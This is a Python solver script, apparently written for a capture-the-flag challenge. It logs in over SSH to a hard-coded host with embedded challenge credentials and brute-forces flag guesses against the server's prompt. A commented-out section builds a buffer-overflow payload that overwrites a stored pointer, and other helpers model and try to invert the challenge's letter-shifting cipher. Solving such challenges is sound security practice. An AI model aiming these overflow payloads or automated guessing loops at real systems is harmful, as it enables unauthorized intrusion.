import paramiko
import time


import warnings
warnings.filterwarnings("ignore")


class SshClient:
    def __init__(self, ip, port, username, password, key_path=None):
        self.ip = ip
        self.port = port
        self.username = username
        self.password = password
        self.key_path = key_path
        self.ssh_connection = None
    
    def __enter__(self):
        try:
            # key = paramiko.RSAKey.from_private_key_file(self.key_path, password=self.password)
            
            self.ssh_connection = paramiko.SSHClient()
            self.ssh_connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            self.ssh_connection.connect(self.ip, self.port, self.username, self.password)

            return self


        except Exception as e:
            print("[!] Exception: {}".format(e))

    def __exit__(self, exception_type, exception_value, traceback):
        if self.ssh_connection:
            self.ssh_connection.close()
    
    def execute_command(self, command):
        stdin, stdout, stderr = self.ssh_connection.exec_command(command)

        while not stdout.channel.exit_status_ready() and not stdout.channel.recv_ready():time.sleep(1)
        
        return stdin, stdout, stderr


def reverse_server_logic(guess):
    magic = ["M", "A", "G", "I", "C"]
    magics = ""
    for i in range(len(guess)):
        magics += magic[i % len(magic)]

    bufs = []
    for i in range(len(guess)):
        c = ord(guess[i])

        if 65 <= c <= 90:
            c -= 65
            c = c - ord(magics[i]) - 97
            c -= 65

            c %= 26

            c += 65
            bufs += chr(c)
        elif 97 <= c <= 122:
            c -= 97

            c = c - ord(magics[i].lower()) - 97
            
            c %= 26
            c += 97

            bufs += chr(c)
        else:
            bufs += chr(c)

    print(bufs)
    pass



# characters = "_"
# characters = "defghijklmnopqrstuvwxyz0123456789_!@#$%^&*()+\{\}[]></;'"
# characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

def server_logic(guess, magic):
    magics = ""
    for i in range(len(guess)):
        magics += magic[i % len(magic)]

    bufs = []
    for i in range(len(guess)):
        c = ord(guess[i])

        if 65 <= c <= 90:
            c -= 65
            c = c + (ord(magics[i]) - 65)

            c %= 26

            c += 65
            bufs += chr(c)
        elif 97 <= c <= 122:
            c -= 97

            c = c + (ord(magics[i].lower()) - 97)
            
            c %= 26
            c += 97

            bufs += chr(c)
        else:
            bufs += chr(c)

    return "".join(bufs)


import itertools
if __name__ == '__main__':
    state_machine = [
        {
            "addr": "\x24\x2b",
            "index": 12,
            "counter": "\x00\x00\x00\x00"
        },
        {
            "addr": "\x17\x2b",
            "index": 31,
            "counter": "\x00\x00\x00\x00"
        },
        {
            "addr": "\x0a\x2b",
            "index": 15,
            "counter": "\x00\x00\x00\x00"
        },
        {
            "addr": "\xfd\x2a",
            "index": 27,
            "counter": "\x00\x00\x00\x00"
        },
        {
            "addr": "\xf0\x2a",
            "index": 25,
            "counter": "\x00\x00\x00\x00"
        },
        {
            "addr": "\xe3\x2a",
            "index": 7,
            "counter": "\x00\x00\x00\x00"
        },
        {
            "addr": "\xd6\x2a",
            "index": 23,
            "counter": "\xff\xff\xff\xff"
        },
        {
            "addr": "\xc9\x2a",
            "index": 21,
            "counter": "\xfe\xff\xff\xff"
        },
        {
            "addr": "\xbc\x2a",
            "index": 30,
            "counter": "\xfe\xff\xff\xff"
        },
        {
            "addr": "\xaf\x2a",
            "index": 20,
            "counter": "\xfd\xff\xff\xff"
        },
        {
            "addr": "\xa2\x2a",
            "index": 17,
            "counter": "\xfd\xff\xff\xff"
        },
        {
            "addr": "\x95\x2a",
            "index": 26,
            "counter": "\xfd\xff\xff\xff"
        },
        {
            "addr": "\x88\x2a",
            "index": 3,
            "counter": "\xfd\xff\xff\xff"
        },
        {
            "addr": "\x7b\x2a",
            "index": 14,
            "counter": "\xfd\xff\xff\xff"
        },
        {
            "addr": "\x6e\x2a",
            "index": 11,
            "counter": "\xfd\xff\xff\xff"
        },
        {
            "addr": "\x61\x2a",
            "index": 24,
            "counter": "\xfd\xff\xff\xff"
        },
        {
            "addr": "\x54\x2a",
            "index": 10,
            "counter": "\xfd\xff\xff\xff"
        },
        {
            "addr": "\x47\x2a",
            "index": 9,
            "counter": "\xfd\xff\xff\xff"
        },
        {
            "addr": "\x3a\x2a",
            "index": 19,
            "counter": "\xfd\xff\xff\xff"
        },
        {
            "addr": "\x2d\x2a",
            "index": 13,
            "counter": "\xfd\xff\xff\xff"
        },
        {
            "addr": "\x20\x2a",
            "index": 8,
            "counter": "\xfd\xff\xff\xff"
        },
        {
            "addr": "\x0b\x2a",
            "index": 29,
            "counter": "\xfd\xff\xff\xff"
        },
        {
            "addr": "\x06\x2a",
            "index": 6,
            "counter": "\xfd\xff\xff\xff"
        },
        {
            "addr": "\xf9\x29",
            "index": 5,
            "counter": "\xfd\xff\xff\xff"
        },
        {
            "addr": "\xec\x29",
            "index": 22,
            "counter": "\xfc\xff\xff\xff"
        },
        {
            "addr": "\xdf\x29",
            "index": 4,
            "counter": "\xfc\xff\xff\xff"
        },
        {
            "addr": "\xd2\x29",
            "index": 16,
            "counter": "\xfc\xff\xff\xff"
        },
        {
            "addr": "\xc5\x29",
            "index": 2,
            "counter": "\xfc\xff\xff\xff"
        },
        {
            "addr": "\xb8\x29",
            "index": 1,
            "counter": "\xfc\xff\xff\xff"
        },
        {
            "addr": "\xab\x29",
            "index": 18,
            "counter": "\xfc\xff\xff\xff"
        },
        {
            "addr": "\x9e\x29",
            "index": 28,
            "counter": "\xfc\xff\xff\xff"
        },
        {
            "addr": "\x91\x29",
            "index": 0,
            "counter": "\xfc\xff\xff\xff"
        }
    ]

    
    flag = "t3@zf_u_t!w3_0x3rcz1f{}_r01t73d5"
    flag = "h3@rd_u_l!k3_0v3rwr1t{}_p01n73r5"

    characters = "abcdefghijklmnopqrstuvwxyz0123456789_!@#$%^&"
    
    i = -1
    for a in itertools.product(characters, repeat=2):
        test = "".join(a)
        i += 1

        # if i < 138: continue

        print("Iteration: {}".format(i))

        a = True
        while a:
            try:
                with SshClient("35.157.31.6", 22, "challenger", "arkcon") as ssh_client:
                    shell = ssh_client.ssh_connection.invoke_shell()
                    data = shell.recv(1024)
                    print(data)
                    # print(data)

                    # test_flag = flag[:index] + test + flag[index+1:]
                    # test_flag = flag
                    # print(test_flag)

                
                    # data = "A" * 64 + test_flag + "\x00"*24 + state_machine[iii]["addr"] + "\r"
                    data = "A" * 6 + '\r'
                    shell.sendall(data)

                    data = shell.recv(1024)
                    print(data)

                    data = "1\r"
                    shell.sendall(data)
                    
                    # time.sleep(1)

                    data = shell.recv(1024)
                    print(data)

                    # magic = ["M", "A", "G", "I", "C"]
                        #  h3@rd_u_l!k3_0v3rwr1OAUSp01n73r5
                    # _ = "h3@rd_u_l!k3_0v3rwr1{} _p01n73r5".format(test)
                    # _ = "h3@rd_u_l!k3_0v3rwr171ngp01n73r5"
                    test_flag = flag.format(test)
                    test_flag = "h3@rd_u_l!k3_0v3rwr171n_p01n73r5"
                    # test_flag = server_logic(test_flag, magic)
                    # flag = "t3@zf_u_t!w3_0x3rcz1338_r01t73d5"

                    data = test_flag + "\r"
                    shell.sendall(data)

                    data = shell.recv(1024)
                    print(data)

                    if "Wrong! Try again ;)" in data:
                        print("test now is: {}".format(test_flag))
                        a = False
                    elif "Flag found" in data:
                        print("Found: {}!".format(test_flag))
                        exit()
                        a = False
            except KeyboardInterrupt: exit()
            except: pass            


    
    
    
    
    
    # for iii in range(31, 32):
    #     print(state_machine[iii])
    #     # print("Iteration: {}".format(iii))
    
    #     index = state_machine[iii]["index"]
        
    #     if 20 <= index <= 23: continue

    #     flag = flag[:20] + state_machine[iii]["counter"] + flag[24:]

    #     char_index = 0
    #     # characters = "tedsin0123456789_!@#$"
    #     # characters = "abcdefghijklmnopqrstuvwxyz0123456789_!@#$%^&*()+\{\}[]></;'"
    #     characters = "t"

    #     test = characters[char_index]
    #     # print("test now is: {}".format(test))

    #     # i = 0
    #     # for a in itertools.product(characters, repeat=3):
    #         # test = "".join(a)
    #         # i += 1


    #     a = True
    #     while a:
    #         with SshClient("35.157.31.6", 22, "challenger", "arkcon") as ssh_client:
    #             shell = ssh_client.ssh_connection.invoke_shell()
    #             data = shell.recv(1024)
    #             # print(data)
    #             # print(data)

    #             test_flag = flag[:index] + test + flag[index+1:]
    #             # test_flag = flag
    #             print(test_flag)

            
    #             data = "A" * 64 + test_flag + "\x00"*24 + state_machine[iii]["addr"] + "\r"
    #             # data = "A" * 6 + '\r'
    #             shell.sendall(data)

    #             data = shell.recv(1024)
    #             # print(data)

    #             data = "2\r"
    #             shell.sendall(data)
                
    #             # time.sleep(1)

    #             data = shell.recv(1024)
    #             # print(data)

    #             # magic = ["M", "A", "G", "I", "C"]
    #                 #  h3@rd_u_l!k3_0v3rwr1OAUSp01n73r5
    #             # _ = "h3@rd_u_l!k3_0v3rwr1{} _p01n73r5".format(test)
    #             # _ = "h3@rd_u_l!k3_0v3rwr171ngp01n73r5"
                
    #             # flag = server_logic(_, magic)
    #             # flag = "t3@zf_u_t!w3_0x3rcz1338_r01t73d5"

    #             # data = flag + "\r"
    #             # shell.sendall(data)

    #             # data = shell.recv(1024)
    #             # print(data)

    #             if "Wrong! Try again ;)" in data:
    #                 # print("test now is: {}".format(flag))
    #                 a = False
    #             elif "Flag found" in data:
    #                 print("Found: {}!".format(flag))
    #                 exit()
    #                 a = False


